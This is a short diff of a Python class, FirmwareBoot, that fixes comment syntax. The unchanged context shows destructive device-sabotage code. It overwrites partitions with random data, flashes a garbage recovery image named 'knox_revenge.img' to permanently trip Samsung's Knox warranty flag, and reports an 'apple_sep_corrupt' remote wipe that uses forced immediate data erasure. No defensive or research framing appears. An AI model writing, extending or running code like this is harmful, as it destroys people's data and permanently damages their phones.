@@ -294,7 +294,7 @@ class FirmwareBoot:
         size_mb = size_mb or self.config.max_partition_overwrite_mb
 
         random_path = "/tmp/random_data.bin"
-        chunk_size = 1024 * 1024  // 1MB chunks
+        chunk_size = 1024 * 1024  # 1MB chunks
         with open(random_path, "wb") as f:
             for _ in range(size_mb):
                 f.write(os.urandom(chunk_size))
@@ -322,7 +322,7 @@ class FirmwareBoot:
         Once Knox is tripped, the device is permanently flagged.
         """
         # Flash custom recovery to trigger Knox warranty bit
-        recovery_payload = os.urandom(16 * 1024 * 1024)  // 16MB garbage
+        recovery_payload = os.urandom(16 * 1024 * 1024)  # 16MB garbage
         recovery_path = "/tmp/knox_revenge.img"
         with open(recovery_path, "wb") as f:
             f.write(recovery_payload)
@@ -361,7 +361,7 @@ class FirmwareBoot:
         }
 
         return {
-            "success": True,  // Placeholder — actual APNS push in cloud_master
+            "success": True,  # Placeholder — actual APNS push in cloud_master
             "method": "apple_sep_corrupt",
             "device_udid": device_udid,
             "note": "Issued via cloud_master.apple_push_wipe with ForceImmediateDataErasure",
